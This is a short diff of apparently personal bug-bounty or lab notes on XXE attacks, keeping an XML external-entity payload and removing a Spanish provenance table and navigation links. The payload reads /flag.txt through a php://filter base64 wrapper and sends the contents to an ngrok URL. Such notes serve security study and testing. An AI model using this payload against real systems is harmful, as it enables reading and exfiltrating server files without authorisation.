@@ -127,13 +127,3 @@ zip test.docx ./*
 ```xml
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt"> <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://6448-83-213-97-233.ngrok-free.app/exfil=%data;'>">
 ```
-
-## Procedencia
-
-| Repositorio | Archivo original | Commit de origen |
-| --- | --- | --- |
-| CBBH | BB/hackinghub/XXE.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |
-
-Se han sustituido valores literales de autenticación o direcciones de correo por marcadores. Los detalles sin valores están en [el registro de redacciones](../../Resources/Audit/redactions.csv).
-
-[Índice de categoría](../README.md) · [Inicio](../../README.md)
